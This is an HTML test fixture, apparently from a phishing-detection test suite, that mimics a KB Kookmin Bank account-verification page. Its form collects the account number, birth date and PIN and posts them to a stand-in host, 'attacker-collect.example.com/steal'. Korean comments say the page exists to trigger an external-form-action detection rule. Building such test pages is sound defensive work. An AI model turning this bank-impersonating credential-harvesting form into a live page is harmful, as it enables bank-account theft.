<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>KB국민은행 계좌 확인</title>
  <style>
    body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; background: #eef2f7; }
    .box { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 12px rgba(0,0,0,.1); width: 340px; }
    .logo { display: flex; align-items: center; gap: 10px; margin-bottom: 24px; }
    .logo-mark { width: 32px; height: 32px; background: #fabc00; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; font-size: 14px; }
    h2 { margin: 0; font-size: 17px; color: #333; }
    p { color: #888; font-size: 13px; margin: 0 0 20px; }
    input { width: 100%; padding: 12px 14px; margin: 6px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; font-size: 14px; }
    button { width: 100%; padding: 13px; background: #fabc00; color: white; border: none; border-radius: 4px; font-size: 15px; cursor: pointer; margin-top: 10px; font-weight: bold; }
    .badge { display: block; text-align: center; margin-top: 20px; font-size: 11px; color: #bbb; border-top: 1px solid #f0f0f0; padding-top: 14px; }
    code { background: #f5f5f5; padding: 2px 5px; border-radius: 3px; font-size: 10px; }
  </style>
</head>
<body>
  <div class="box">
    <div class="logo">
      <div class="logo-mark">KB</div>
      <h2>KB국민은행 계좌 확인</h2>
    </div>
    <p>본인 확인을 위해 계좌 정보를 입력해 주세요.</p>
    <!--
      action이 현재 도메인과 다른 외부 도메인을 가리킴
      → _analyze_dom()의 external_form_action = True 트리거
      Playwright가 POST를 차단하므로 실제 전송은 발생하지 않음
    -->
    <form method="POST" action="https://attacker-collect.example.com/steal">
      <input type="text" name="account" placeholder="계좌번호 (- 없이 입력)">
      <input type="text" name="birth" placeholder="생년월일 8자리">
      <input type="password" name="pin" placeholder="계좌 비밀번호">
      <button type="submit">확인</button>
    </form>
    <span class="badge">
      [7-B 탐지 테스트 ②] <code>external_form_action</code> → <strong>+40점</strong><br>
      action: <code>attacker-collect.example.com</code> (현재 도메인과 불일치)
    </span>
  </div>
</body>
</html>
